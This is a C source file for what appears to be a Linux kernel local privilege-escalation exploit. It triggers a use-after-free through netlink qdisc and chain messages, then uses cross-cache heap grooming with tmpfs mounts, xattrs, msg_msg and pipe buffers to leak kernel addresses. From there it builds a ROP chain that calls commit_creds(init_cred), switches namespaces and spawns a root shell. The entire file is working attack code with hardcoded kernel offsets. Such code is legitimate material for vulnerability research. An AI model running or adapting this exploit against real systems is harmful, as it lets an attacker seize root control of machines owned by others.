#define _GNU_SOURCE

#include <endian.h>
#include <sched.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <err.h>
#include <ctype.h>
#include <errno.h>
#include <time.h>
#include <inttypes.h>
#include <math.h>
#include <pthread.h>
#include <assert.h>

#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <sys/xattr.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/syscall.h>

#include <linux/rtnetlink.h>
#include <linux/pkt_sched.h>
#include <linux/membarrier.h>

#include <arpa/inet.h>

#include "modules/pipe.h"
#include "modules/xattr.h"
#include "modules/helper.h"
#include "modules/msg_msg.h"


#define BITMASK(bf_off,bf_len) (((1ull << (bf_len)) - 1) << (bf_off))
#define STORE_BY_BITMASK(type,htobe,addr,val,bf_off,bf_len) *(type*)(addr) = htobe((htobe(*(type*)(addr)) & ~BITMASK((bf_off), (bf_len))) | (((type)(val) << (bf_off)) & BITMASK((bf_off), (bf_len))))

#ifndef NFT_CHAIN_BINDING
#define NFT_CHAIN_BINDING (1 << 2)
#endif

#define FIRST_SPRAY_SZ 0x1d00
#define SECOND_SPRAY_SZ (FIRST_SPRAY_SZ + 0x400)
#define THIRD_SPRAY_SZ (SECOND_SPRAY_SZ + 0x400)

#define MTYPE_PRIMARY 0x41

#define CC_OVERFLOW_FACTOR 1
#define OBJS_PER_SLAB 16
#define CPU_PARTIAL (24 * 6)
#define OBJS_FRONT 48

#define TMPFS_MOUNT_POINT "/tmp/tmpfs_mountpoint"

#define XATTR_FILE "/tmp/a"
#define XATTR_VALUE "value"

#define XATTR_PADDING_STR "security.attr"
#define ATTRIBUTE_NAME_LEN 0x100
#define VALUE_NAME_LEN 0x400 - 0x20
#define HEAD_VALUE_NAME_LEN 0x100
#define FILENAME_LEN 0x80

int spray_qids[0x1000];

uint64_t usleep_time = 5000000;
uint64_t prefix_spray_cnt = 0;
uint64_t ignore_xattr_idx[] = {-1, -1, -1, -1, -1, -1, -1, -1, -1, -1};
struct pipeio *glb_pipes[0x600] = {0, };

int passer;
char *dupfile = NULL;
char *dupattr = NULL;

uint64_t kbase = 0, kheap_leak = 0;

void pre_make_mount_dir(char *fname)
{
	for(int i=0; i<0x8000; i++)
	{
		char mount_fldname[0x100];
		snprintf(mount_fldname, 0x100, "%s-%05d", fname, i);

		struct stat sb;
		if(stat(mount_fldname, &sb))
			mkdir(mount_fldname, 0644);
	}
}

void mount_file(char *fname, int idx)
{
	char mount_fldname[0x100];
	snprintf(mount_fldname, 0x100, "%s-%05d", fname, idx);
	if (mount("none", mount_fldname, "tmpfs", 0, NULL) < 0) {
		fprintf(stderr, "mount %s(type: tmpfs): %s\n", mount_fldname, strerror(errno));
		printf("[-] cross cache: mount fail\n");
	}
}

void umount_file(char *fname, int idx)
{
	char mount_fldname[0x100];
	snprintf(mount_fldname, 0x100, "%s-%05d", fname, idx);
	if (umount(mount_fldname) < 0) {
		fprintf(stderr, "umount %s(type: tmpfs): %s\n", mount_fldname, strerror(errno));
		printf("[-] cross cache: umount fail\n");
	}
}

void cross_cache_spray1()
{
	for(int i=0; i<OBJS_FRONT; i++)
		mount_file(TMPFS_MOUNT_POINT, i);
	printf("[+] cross cache: cross_cache_spray1 pass\n");
}

void cross_cache_spray2()
{
	for(int i=OBJS_FRONT; i<OBJS_PER_SLAB * (CPU_PARTIAL + 2) * CC_OVERFLOW_FACTOR; i++)
		mount_file(TMPFS_MOUNT_POINT, i);
	printf("[+] cross cache: cross_cache_spray2 pass\n");
}

void cross_cache_remove_all_chunk()
{
	for(int i=0; i<OBJS_PER_SLAB * (CPU_PARTIAL + 2) * CC_OVERFLOW_FACTOR; i++)
		if(i % OBJS_PER_SLAB)
			umount_file(TMPFS_MOUNT_POINT, i);
	for(int i=0; i<OBJS_PER_SLAB * (CPU_PARTIAL + 2) * CC_OVERFLOW_FACTOR; i++)
		if(!(i % OBJS_PER_SLAB))
			umount_file(TMPFS_MOUNT_POINT, i);
}

char *leak_kheap(const char *filename, char *attribute_name) {
	char *leak = (char *)calloc(sizeof(char), 0x10000);
	int length = 0;

	char value_name[192];
	if((length = getxattr(filename, attribute_name, leak, 0x10000)) > VALUE_NAME_LEN)
	{
		printf("[+] overwrite success! let's leak (rcu_counter = %lx)\n", length);
		dupfile = strdup(filename);
		dupattr = strdup(attribute_name);

		return leak;
	}
	return NULL;
}

void leak_xattr2(const char *filename, char *attribute_name) {
	char *leak = (char *)calloc(sizeof(char), 0x10000);
	int length = 0;
	if((length = getxattr(filename, attribute_name, leak, 0x10000)) < 0)
		panic("getxattr");
}

void spray_simple_xattr_for_leak_first(uint32_t cnt) {
	char file_name[FILENAME_LEN];
	char value_name[XATTR_VALUE_KMALLOC_CG_8K];
    char attribute_name[XATTR_VALUE_KMALLOC_CG_8K];

    for (uint64_t i = prefix_spray_cnt; i < prefix_spray_cnt + cnt; i++) {
		snprintf(file_name, FILENAME_LEN, "%s-%08d", XATTR_FILE, i);

		*(uint64_t *)value_name = i;
		snprintf(attribute_name, ATTRIBUTE_NAME_LEN, "security.attr%26lu-%s", 5, XATTR_PADDING_STR);
		create_xattr(file_name, attribute_name, value_name, XATTR_VALUE_KMALLOC_CG_128+1, true);

		if(i % 0x10 == 0)
		{
			glb_pipes[(i - prefix_spray_cnt)/0x10] = create_pipeio();
			resize_pipe(glb_pipes[(i - prefix_spray_cnt)/0x10], PIPE_BUFFER_KMALLOC_CG_192);
			activate_ops(glb_pipes[(i - prefix_spray_cnt)/0x10]);
		}
	}
}

void spray_simple_xattr_for_leak_second(uint32_t cnt) {

	char file_name[FILENAME_LEN];
	char value_name[XATTR_VALUE_KMALLOC_CG_8K] = {0, };
    char attribute_name[XATTR_VALUE_KMALLOC_CG_8K];

    for (uint64_t i = prefix_spray_cnt; i < prefix_spray_cnt + cnt; i++) {

		snprintf(file_name, FILENAME_LEN, "%s-%08d", XATTR_FILE, i);

		snprintf(value_name, VALUE_NAME_LEN, "security.value%05lu-%s", i, XATTR_PADDING_STR);
		snprintf(attribute_name, ATTRIBUTE_NAME_LEN, "security.attr%26lu-%s", 3, XATTR_PADDING_STR);
		create_xattr(file_name, attribute_name, value_name, XATTR_VALUE_KMALLOC_CG_2K, true);

		snprintf(value_name, VALUE_NAME_LEN, "security.value%05lu-%s", i, XATTR_PADDING_STR);
		snprintf(attribute_name, ATTRIBUTE_NAME_LEN, "security.attr%26lu-%s", 7, XATTR_PADDING_STR);
        create_xattr(file_name, attribute_name, value_name, XATTR_VALUE_KMALLOC_CG_2K, true);
    }
}

char *read_simple_xattr_for_leak(uint32_t idx) {

	char file_name[FILENAME_LEN];
    char attribute_name[ATTRIBUTE_NAME_LEN];

    /* Need that the name is allocated within `kmalloc-256` */
	snprintf(file_name, FILENAME_LEN, "%s-%08d", XATTR_FILE, idx/3);
	snprintf(attribute_name, ATTRIBUTE_NAME_LEN, "security.attr%26lu-%s", 5, XATTR_PADDING_STR);
	return leak_kheap(file_name, attribute_name);
}

void pre_make_xattr_file(const char *str, uint64_t last)
{
	int fd = creat(str, 0644);
	if(fd < 0)
		panic("creat");
	close(fd);
    for (uint64_t i = prefix_spray_cnt; i < prefix_spray_cnt + last; i++) {
		char file_name[FILENAME_LEN];
		snprintf(file_name, FILENAME_LEN, "%s-%08d", str, i);
		int fd = creat(file_name, 0644);
		if(fd < 0)
			panic("creat");
		close(fd);
    }
}

uint64_t info;
int sock1, sock2, sock3;

void set_network()
{
	int res;

	mmap(0x20000000ul, 0x1000000ul, 7ul, 0x32ul, -1, 0ul);

	res = socket(0x10ul, 3, 0);
	if (res != -1)
		sock1 = res;
	res = socket(0x10ul, 3, 0);
	if (res != -1)
		sock2 = res;
	res = socket(0x10ul, 3ul, 0);
	if (res != -1)
		sock3 = res;

	*(uint64_t*)0x20000040 = 0;
	*(uint32_t*)0x20000048 = 0;
	*(uint64_t*)0x20000050 = 0x20000100;
	*(uint64_t*)0x20000058 = 1;
	*(uint64_t*)0x20000060 = 0;
	*(uint64_t*)0x20000068 = 0;
	*(uint32_t*)0x20000070 = 0;

	*(uint64_t*)0x20000100 = 0x20000240;
	*(uint64_t*)0x20000108 = 0x24;

	*(uint32_t*)0x20000240 = 0x24;
	*(uint16_t*)0x20000244 = 0x24;
	*(uint16_t*)0x20000246 = 0;
	*(uint32_t*)0x20000248 = 0;
	*(uint32_t*)0x2000024c = 0;

	*(uint8_t*)0x20000250 = 0;
	*(uint8_t*)0x20000251 = 0;
	*(uint16_t*)0x20000252 = 0;
	*(uint32_t*)0x20000254 = 0;
	*(uint32_t*)0x20000258 = 0;
	*(uint32_t*)0x2000025c = 0;
	*(uint32_t*)0x20000260 = 0;

	sendmsg(sock3, 0x20000040ul, 0ul);

	*(uint32_t*)0x20000100 = 0x14;
	res = getsockname(sock3, (struct sockaddr *)0x20000080ul, 0x20000100ul);
	if (res != -1)
		info = *(uint32_t*)0x20000084;

	*(uint64_t*)0x20000040 = 0;
	*(uint32_t*)0x20000048 = 0;
	*(uint64_t*)0x20000050 = 0x20000000;
	*(uint64_t*)0x20000058 = 1;
	*(uint64_t*)0x20000060 = 0;
	*(uint64_t*)0x20000068 = 0;
	*(uint32_t*)0x20000070 = 0;

	*(uint64_t*)0x20000000 = 0x200008c0;
	*(uint64_t*)0x20000008 = 0x48;

	memcpy((void*)0x200008c0, "\x48\x00\x00\x00\x10\x00\x05\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x90", 20);
	*(uint32_t*)0x200008d4 = info;
	memcpy((void*)0x200008d8, "\x00\x00\x00\x00\x00\x00\x00\x00\x28\x00\x12\x00\x0c\x00\x01\x00\x76\x65\x74\x68", 20);

	sendmsg(sock2, 0x20000040ul, 0ul);
}

__attribute__((always_inline)) void qdisc_init()
{
	/* iovec */
	*(uint64_t*)0x300006c0 = 0;
	*(uint32_t*)0x300006c8 = 0;
	*(uint64_t*)0x300006d0 = 0x30000780;
	*(uint64_t*)0x300006d8 = 1;
	*(uint64_t*)0x300006e0 = 0;
	*(uint64_t*)0x300006e8 = 0;
	*(uint32_t*)0x300006f0 = 0;

	*(uint64_t*)0x30000780 = 0x30000480;
	*(uint64_t*)0x30000788 = 0x54 + 0xc;


	/* struct nlmsghdr */
	*(uint32_t*)0x30000480 = 0x54 + 0xc;	// nlmsg_len
	*(uint16_t*)0x30000484 = 0x24;	// nlmsg_type
	*(uint16_t*)0x30000486 = 0xf1d;	// nlmsg_flags
	*(uint32_t*)0x30000488 = 0;	// nlmsg_seq
	*(uint32_t*)0x3000048c = 0;	// nlmsg_pid

	/* struct tcmsg */
	*(uint8_t*)0x30000490 = 0;
	*(uint8_t*)0x30000491 = 0;
	*(uint16_t*)0x30000492 = 0;
	*(uint32_t*)0x30000494 = info;
	*(uint16_t*)0x30000498 = 0;
	*(uint16_t*)0x3000049a = 0;
	*(uint16_t*)0x3000049c = 0xfff1;
	*(uint16_t*)0x3000049e = -1;
	*(uint16_t*)0x300004a0 = 0;
	*(uint16_t*)0x300004a2 = 0;

	/* struct nlattr */
	*(uint16_t*)0x300004a4 = 0xb;
	*(uint16_t*)0x300004a6 = 1;	// TCA_KIND
	/* payload */
	memcpy((void*)0x300004a8, "ingress\000", 8);
	/* struct nlattr */
	*(uint16_t*)0x300004b0 = 0x24;
	STORE_BY_BITMASK(uint16_t, , 0x300004b2, 8, 0, 14);
	STORE_BY_BITMASK(uint16_t, , 0x300004b3, 0, 6, 1);
	STORE_BY_BITMASK(uint16_t, , 0x300004b3, 1, 7, 1);
	*(uint16_t*)0x300004b4 = 0x1c;
	*(uint16_t*)0x300004b6 = 1;
	*(uint8_t*)0x300004b8 = 0;
	*(uint8_t*)0x300004b9 = 0;
	*(uint16_t*)0x300004ba = 0;
	*(uint32_t*)0x300004bc = 0;
	*(uint32_t*)0x300004c0 = 0;
	*(uint32_t*)0x300004c4 = 0;
	*(uint32_t*)0x300004c8 = 0;
	*(uint32_t*)0x300004cc = 0;
	*(uint16_t*)0x300004d0 = 4;
	*(uint16_t*)0x300004d2 = 2;
	/* struct nlattr */
	*(uint16_t*)0x300004d4= 0xc;   // nla_len
	*(uint16_t*)0x300004d6 = 13;    // nla_type
	/* payload */
	*(uint64_t*)0x300004d8 = 1;
}

__attribute__((always_inline)) void qdisc_set(char *kind)
{
	strcpy((void*)0x300004a8, kind);
	syscall(__NR_sendmsg, /*fd=*/sock1, /*msg=*/0x300006c0ul, /*f=*/0ul);
}

__attribute__((always_inline)) void chain0(void)
{
	*(uint64_t*)0x30010280 = 0;
	*(uint32_t*)0x30010288 = 0;
	*(uint64_t*)0x30010290 = 0x30010240;
	*(uint64_t*)0x30010298 = 1;
	*(uint64_t*)0x300102a0 = 0;
	*(uint64_t*)0x300102a8 = 0;
	*(uint32_t*)0x300102b0 = 0;

	*(uint64_t*)0x30010240 = 0x30010340;
	*(uint64_t*)0x30010248 = 0x24;

	/* struct nlmsghdr */
	*(uint32_t*)0x30010340 = 0x24;  // nlmsg_len
	*(uint16_t*)0x30010344 = 100;   // nlmsg_type
	*(uint16_t*)0x30010346 = 0xf31; // nlmsg_flags
	*(uint32_t*)0x30010348 = 0;     // nlmsg_seq
	*(uint32_t*)0x3001034c = 0;     // nlmsg_pid

	/* struct tcmsg */
	*(uint8_t*)0x30010350 = 0;      // tcm_family
	*(uint8_t*)0x30010351 = 0;      // tcm__pad1
	*(uint16_t*)0x30010352 = 0;     // tcm__pad2
	*(uint32_t*)0x30010354 = 0xFFFFFFFF;    // tcm_ifindex
	*(uint16_t*)0x30010358 = 0;     // tcm_handle
	*(uint16_t*)0x3001035a = 0;
	*(uint32_t*)0x3001035c = 1;     // tcm_parent	// tcm_block_index
	*(uint16_t*)0x30010360 = 0;     // tcm_info
	*(uint16_t*)0x30010362 = 0;

	syscall(__NR_sendmsg, /*fd=*/sock1, /*msg=*/0x30010280ul, /*f=*/0ul);
}

void trigger_uaf_write(int pip1[], int pip2[], int affi)
{
	int fd;
	uint64_t t[4] = {0xffffffffffffffff, 0xffffffffffffffff, 0xffffffffffffffff, 0x0};
	intptr_t ret = 0;
	char step[10];

	cpu_affinity(affi);
	unshare_setup(CLONE_NEWUSER | CLONE_NEWNS | CLONE_NEWNET);

	set_network();

	syscall(__NR_mmap, /*addr=*/0x30000000ul, /*len=*/0x1000000ul, /*prot=*/7ul, /*flags=*/0x32ul, /*fd=*/-1, /*offset=*/0ul);
	
	ret = syscall(__NR_sendmsg, /*fd=*/sock1, /*msg=*/0x300006c0ul, /*f=*/0ul);
	
	qdisc_init();
	qdisc_set("ingress");

	chain0();

	qdisc_set("clsact");
	read(pip1[0], step, 10);
	/* ------------- change to ingress (ctx alloc) ---- ------- */

	cross_cache_spray1();

	qdisc_set("ingress");

	if(!passer) 
	{
		syscall(SYS_membarrier, MEMBARRIER_CMD_GLOBAL, 0, -1);	// kfree_rcu wait
		usleep(usleep_time);
	}

	cross_cache_spray2();
	cross_cache_remove_all_chunk();


	write(pip2[1], "step 2", 4);
	/* ------------ uaf write ------------ */
	read(pip1[0], step, 10);

	_exit(0);
}


uint64_t *trigger_spray_chunks(int pip1[], int pip2[])
{
	char step[10];

	unshare_setup(CLONE_NEWUSER | CLONE_NEWNS | CLONE_NEWNET);
	spray_simple_xattr_for_leak_first(FIRST_SPRAY_SZ);

	/* ------------- <exploit alloc, cross cache alloc & exploit free, cross cache free> --------------- */

	write(pip1[1], "step 1", 4);
	read(pip2[0], step, 10);

	spray_simple_xattr_for_leak_second(FIRST_SPRAY_SZ);
	printf("[+] spray xattr, which would be overwriten\n");

	/* -------------------- <exploit write> ------------------------- */

	write(pip1[1], "step 3", 4);

	/* ---------------------- heap oob read ---------------------------------- */
	printf("[*] waiting for exit...\n");
	usleep(100000);

	uint64_t *leaks;
	for(int i=0; i<FIRST_SPRAY_SZ; i++)
	{
		leaks = (uint64_t *)read_simple_xattr_for_leak(prefix_spray_cnt + i);
		if(leaks)
			break;
	}
	if(!leaks)
	{
		printf("[-] leak failed... please retry!\n");
		return leaks;
	}
	
	for(int i=0; i<0x400; i++)
	{
		if(kbase)
			break;
		if((leaks[i] & 0xffffffff80000000) == 0xffffffff80000000 && (leaks[i] & 0xffffffffffff0000) != 0xffffffffffff0000)
		{
			kbase = (((leaks[i] >> 24) - 1) << 24); // memory_stats+352
			break;
		}
	}

	printf("[+] kbase: 0x%llx\n", kbase);

	return leaks;
}

void set_simple_xattr_for_fake_rbtree_first(uint64_t fname_idx, uint64_t attr_name, uint64_t conn1, uint64_t conn2)
{
	char file_name[FILENAME_LEN];
	char value_name[VALUE_NAME_LEN];
    char attribute_name[ATTRIBUTE_NAME_LEN];

	snprintf(file_name, FILENAME_LEN, "%s-%08d", XATTR_FILE, fname_idx);
	snprintf(attribute_name, ATTRIBUTE_NAME_LEN, "security.attr%26lu-%s", 5, XATTR_PADDING_STR);
	remove_xattr(file_name, attribute_name, false);

	struct simple_xattr *new_xattr = fake_xattr(RB_RED, conn1, conn2, 0x0, attr_name + 0x28, 0x10, NULL, 0x0);

	memset(value_name, 0, VALUE_NAME_LEN);
	memcpy(value_name + 0x40 - sizeof(struct simple_xattr), (char *)new_xattr, 0x30); // if chunk is 0x---180 -> 0x---100 (from 0xc0)
	memcpy(value_name + 0x80 - sizeof(struct simple_xattr), (char *)new_xattr, 0x30); // if chunk is 0x---240 -> 0x---200 (from 0x180)

	for(int i=prefix_spray_cnt + FIRST_SPRAY_SZ; i < prefix_spray_cnt + SECOND_SPRAY_SZ; i++)
	{
		snprintf(file_name, FILENAME_LEN, "%s-%08d", XATTR_FILE, i);
		snprintf(attribute_name, ATTRIBUTE_NAME_LEN, "security.attr%26lu-%s", 5, XATTR_PADDING_STR);
		create_xattr(file_name, attribute_name, value_name, XATTR_VALUE_KMALLOC_CG_192, true);
	}

	snprintf(file_name, FILENAME_LEN, "%s-%08d", XATTR_FILE, fname_idx);
	snprintf(attribute_name, ATTRIBUTE_NAME_LEN, "security.attr%26lu-%s", 1, XATTR_PADDING_STR);
	create_xattr(file_name, attribute_name, value_name, XATTR_VALUE_KMALLOC_CG_192, true);

	for(int i=prefix_spray_cnt + SECOND_SPRAY_SZ; i < prefix_spray_cnt + THIRD_SPRAY_SZ; i++)
	{
		snprintf(file_name, FILENAME_LEN, "%s-%08d", XATTR_FILE, i);
		snprintf(attribute_name, ATTRIBUTE_NAME_LEN, "security.attr%26lu-%s", 5, XATTR_PADDING_STR);
		create_xattr(file_name, attribute_name, value_name, XATTR_VALUE_KMALLOC_CG_192, true);
	}

	free(new_xattr);
}

void spray_simple_xattr_for_fake_rbtree_second(uint64_t target)
{
	char file_name[ATTRIBUTE_NAME_LEN];
	char value_name[XATTR_VALUE_KMALLOC_CG_32K*2];
	
	for(int i=prefix_spray_cnt + FIRST_SPRAY_SZ; i < prefix_spray_cnt + SECOND_SPRAY_SZ; i++)
	{
		snprintf(file_name, FILENAME_LEN, "%s-%08d", XATTR_FILE, i);
		char *attribute_name = gen_xattr_name(XATTR_PREFIX_SECURITY, "attr1");
		for(int i=0; i<XATTR_VALUE_KMALLOC_CG_32K/8; i++)
			((uint64_t *)(value_name))[i] = target - 0x20;

		create_xattr(file_name, attribute_name, value_name, XATTR_VALUE_KMALLOC_CG_32K, true);
	}
}

void generate_fake_rbtree(int pip1[], int pip2[], uint64_t fname_idx, uint64_t target, uint64_t attr_name_ptr, uint64_t conn1, uint64_t conn2)
{
	char step[10];

	unshare_setup(CLONE_NEWUSER | CLONE_NEWNS | CLONE_NEWNET);
	
	set_simple_xattr_for_fake_rbtree_first(fname_idx, attr_name_ptr, conn1, conn2);

	/* ------------- <exploit alloc, cross cache alloc & exploit free, cross cache free> --------------- */
	write(pip1[1], "step 1", 4);
	read(pip2[0], step, 10);

	spray_simple_xattr_for_fake_rbtree_second(target);
	printf("[+] spray xattr, which would be overwriten\n");

	/* -------------------- <exploit write> ------------------------- */
	write(pip1[1], "step 3", 4);

	/* ---------------------- heap oob read ---------------------------------- */
	printf("[*] waiting for exit...\n");
	usleep(100000);
}

void spray_msgmsg_for_overwrite_pipe_buffer(uint64_t cnt, uint64_t fake_page, uint64_t fake_ops, uint64_t call_func_addr) {
	char buffer[0x2000] = {0};

	struct pipe_buffer *fake_pipebuf = fake_pipe_buffer(fake_page, 0x0, 0x0, fake_ops, 0x10, 0x40);
	((uint64_t *)buffer)[0] = call_func_addr;
	memcpy(buffer + 0x20, fake_pipebuf, sizeof(struct pipe_buffer));

	for (int i = 0; i < cnt; i++) {
		int msqid = alloc_msg_queue();

		spray_qids[i] = msqid;
		insert_msg_msgseg(msqid, MTYPE_PRIMARY, MSG_MSGSEG_KMALLOC_CG_64, MSG_MSGSEG_KMALLOC_CG_64, buffer);
	}
}

uint64_t read_msgmsg_for_leak_vmemmap_base(uint64_t cnt) {
	uint64_t vmemmap_base = 0;

	for(int i=0; i < cnt; i++)
	{
		char *buf = read_msg_msgseg(spray_qids[i], MTYPE_PRIMARY, MSG_MSGSEG_KMALLOC_CG_64);

		if( (((uint64_t *)(buf))[4] >> 48) == 0xffff)
		{
			vmemmap_base = ((uint64_t *)(buf))[4];
			break;
		}
	}
	return vmemmap_base;
}

void cleanup()
{
	char file_name[FILENAME_LEN];
	int fd = remove(XATTR_FILE);
	if(fd < 0)
		panic("remove");

    for (uint64_t i = prefix_spray_cnt; i < prefix_spray_cnt + THIRD_SPRAY_SZ; i++) {
        snprintf(file_name, FILENAME_LEN, "%s-%08d", XATTR_FILE, i);
		int fd = remove(file_name);
		if(fd < 0)
			panic("remove");

    }
}

void cleanup2(int except)
{
	if(prefix_spray_cnt == 0)
		prefix_spray_cnt += THIRD_SPRAY_SZ;
	else
		prefix_spray_cnt += THIRD_SPRAY_SZ - FIRST_SPRAY_SZ;
}

void cleanup_cg_192()
{
	char file_name[FILENAME_LEN];
	char value_name[XATTR_VALUE_KMALLOC_CG_8K] = {0, };
    char attribute_name[XATTR_VALUE_KMALLOC_CG_8K];

	for (uint64_t i = 0x1000; i < FIRST_SPRAY_SZ; i++) {
		snprintf(file_name, FILENAME_LEN, "%s-%08d", XATTR_FILE, i);
        snprintf(value_name, VALUE_NAME_LEN, "security.value%05lu-%s", i, XATTR_PADDING_STR);
		snprintf(attribute_name, ATTRIBUTE_NAME_LEN, "security.attr%26lu-%s", 9, XATTR_PADDING_STR);
		create_xattr(file_name, attribute_name, value_name, XATTR_VALUE_KMALLOC_CG_192, true);
    }
}

int run(void)
{
	pid_t pid;
	int pip1[2], pip2[2], pip3[2];
	char step[10];
	uint64_t handle_num;
	int p1;
	int status1;
	pthread_t hdr1;

	passer = 0;

	struct regs *sr = save_state();

	pipe(pip1);
	pipe(pip2);
	pipe(pip3);

	if(!fork())
		exit(0);

	cpu_affinity(0);
	pre_make_mount_dir(TMPFS_MOUNT_POINT);
	pre_make_xattr_file(XATTR_FILE, 0x10000);

	if (!fork())
		trigger_uaf_write(pip1, pip2, 0);

	uint64_t *leaks = trigger_spray_chunks(pip1, pip2);

	for(int i=0; i<0x500; i++)
		release_pipe(glb_pipes[i]);

	if (!leaks)
	{
		printf("[-] fail on get xattr node info, cleanup it\n");
		cleanup();
		return -1;
	}

	uint64_t lnode = 0, rnode = 0, attr_name_ptr = 0;

	typedef struct {
		struct simple_xattr xattr;
		int fname_idx;
	} xattr_node_leak;

	xattr_node_leak nodes[0x4000/(0x40/0x8)];
	int nodes_cnt = 0, nodes_front = 0;
	for(int i=0; i < 0x4000/(0x40/0x8); i+=0x40/0x8)
	{
		if(leaks[0x17 + i] == 0x59 && leaks[0x14 + i] && leaks[0x15 + i] && leaks[0x16 + i] && leaks[0x18 + i])
		{
			nodes[nodes_cnt].xattr.rb_node.rb_right = leaks[0x14 + i];
			nodes[nodes_cnt].xattr.rb_node.rb_left = leaks[0x15 + i];
			nodes[nodes_cnt].xattr.name = leaks[0x16 + i];
			nodes[nodes_cnt].fname_idx = leaks[0x18 + i];
			nodes_cnt++;
		}
	}

	printf("[*] total leak cnts: %d\n", nodes_cnt);

	if(nodes_cnt < 5)
	{
		printf("[-] fail on get enough xattr node info, cleanup it\n");
		cleanup();
		return -1;
	}
	if(kbase == 0)
	{
		printf("[-] fail on get kbase, cleanup it\n");
		cleanup();
		return -1;
	}

	printf("[+] success, leak xattr and kbase\n");

	cleanup_cg_192();

	passer = 1;

retry_1bit_off:
	if (!fork())
		trigger_uaf_write(pip1, pip2, 0);

	generate_fake_rbtree(pip1, pip2, (uint64_t)nodes[nodes_front].fname_idx, 
									 (uint64_t)nodes[nodes_front].xattr.rb_node.rb_right + 1, 
									 (uint64_t)nodes[nodes_front].xattr.name, 
									 (uint64_t)nodes[nodes_front].xattr.rb_node.rb_left, 
									 (uint64_t)nodes[nodes_front].xattr.rb_node.rb_left - 0x18);

	char file_name[FILENAME_LEN];
	char value_name[XATTR_VALUE_KMALLOC_CG_8K] = {0, };
    char attribute_name[XATTR_VALUE_KMALLOC_CG_8K];
	snprintf(file_name, FILENAME_LEN, "%s-%08d", XATTR_FILE, nodes[nodes_front].fname_idx);

	printf("[*] try to remove fake xattr\n");
	if(remove_xattr(file_name, "security.attr", false) < 0)
	{
		printf("[-] fail on remove_xattr, cleanup it\n");
		cleanup2(nodes[nodes_front].fname_idx);
		nodes_front++;
		passer = 0;
		goto retry_1bit_off;
	}

	struct pipeio *pipes[0x1f8];
	for(int i=0; i<0x1f8; i++)
	{
		pipes[i] = create_pipeio();
		resize_pipe(pipes[i], PIPE_BUFFER_KMALLOC_CG_64);
	}

	printf("[+] pipe alloc fin\n");

	snprintf(attribute_name, ATTRIBUTE_NAME_LEN, "security.attr%26lu-", 1);
	remove_xattr_noerror(file_name, attribute_name);
	
	for(int i=prefix_spray_cnt + FIRST_SPRAY_SZ; i < prefix_spray_cnt + THIRD_SPRAY_SZ; i++)
	{
		snprintf(file_name, FILENAME_LEN, "%s-%08d", XATTR_FILE, i);
		snprintf(attribute_name, ATTRIBUTE_NAME_LEN, "security.attr%26lu-", 5);
		remove_xattr_noerror(file_name, attribute_name);
	}

	spray_msgmsg_for_overwrite_pipe_buffer(0x300, 0x0, 0x0, 0x0);
	
	for(int i=0; i<0x1f8; i++)
		activate_ops(pipes[i]);

	uint64_t vmemmap_base = (read_msgmsg_for_leak_vmemmap_base(0x300) >> 28) << 28;
	uint64_t kheap_base = (((((uint64_t)nodes[nodes_front].xattr.rb_node.rb_right - 0x6000000) >> 28) - 0x10) << 28);
	uint64_t longjump_victim_address = kbase + 0x2c51a40;

	printf("[*] page_offset_base: 0x%llx\n", kheap_base);
	printf("[*] vmemmap base: 0x%llx\n", vmemmap_base);
	printf("[*] longjump victim address: 0x%llx\n", longjump_victim_address);
	if(vmemmap_base == 0)
	{
		printf("[-] fail on get vmemmap_base, cleanup it");
		cleanup();
		return -1;
	}

	uint64_t wakeup_long64 = kbase + 0x12c291;

	printf("[*] spray msg_msg again\n");
	spray_msgmsg_for_overwrite_pipe_buffer(0x300,
		virt2page(longjump_victim_address & (~0xfff), kheap_base, vmemmap_base), 
		nodes[nodes_front].xattr.name, wakeup_long64
	);

	uint64_t init_cred = kbase + 0x2c72d60;
	uint64_t commit_cred = kbase + 0x001f5520;
	uint64_t prepare_kernel_cred = kbase + 0x001f57d0;
	uint64_t ret_from_fork = kbase + 0x10d430;
	uint64_t msleep = kbase + 0x271300;

	uint64_t find_task_by_vpid = kbase + 0x1e8d60;
	uint64_t switch_task_namespaces = kbase + 0x1f31c0;
	uint64_t set_memory_x = kbase + 0x001551f0;

	uint64_t init_nsproxy = kbase + 0x2c72880;

	uint64_t ret = kbase + 0x5a1;

	// wakeup_long64 
	uint64_t longjump[] = {
		0x0, // rbp
		0x1, // rsi
		longjump_victim_address & (~0xfff), // rdi
		0x0, // rbx
		ret, // rip -> ret
		longjump_victim_address + 0x8*6, // rsp -> stack pivot to longjump victim address
		
		set_memory_x, 

		longjump_victim_address + 0x8*0x18, // pop rdi; ret;
		init_cred,
		commit_cred, // commit_cred(init_cred);

		longjump_victim_address + 0x8*0x18, // pop rdi; ret;
		1,
		find_task_by_vpid, // find_task_by_vpid(1)
		
		longjump_victim_address + 0x8*0x1a, // mov rdi, rax; ret;

		longjump_victim_address + 0x8*0x19, // pop rsi; ret;
		init_nsproxy,
		switch_task_namespaces, // switch_task_namespaces(task, init_nsproxy)

		longjump_victim_address + 0x8*0x1b, // swapgs; iretq;
		0x0,
		sr->cs,
		sr->rflags,
		sr->rsp,
		sr->ss, 
		0x0, // 23

		0xc35f, // pop rdi; ret -> idx: 0x18
		0xc35e, // pop rsi; ret
		0xc3c78948, // mov rdi, rax; ret
		0xcf48f8010f, // swapgs; iretq;
	};

	printf("[+] target: 0x%llx\n", nodes[nodes_front].xattr.name);

	for(int i=0; i<0x1f8; i++)
		write_pipe(pipes[i], ((char *)&longjump - (longjump_victim_address&0xfff)), 
								(longjump_victim_address&0xfff) + sizeof(longjump));

	signal(SIGSEGV, get_shell);

	printf("[*] execute fake ops\n");

	for(int i=0; i<0x1f8; i++)
		release_pipe(pipes[i]);

	return 0;
}


int main(int argc, char *argv[])
{
	while(run() < 0);
}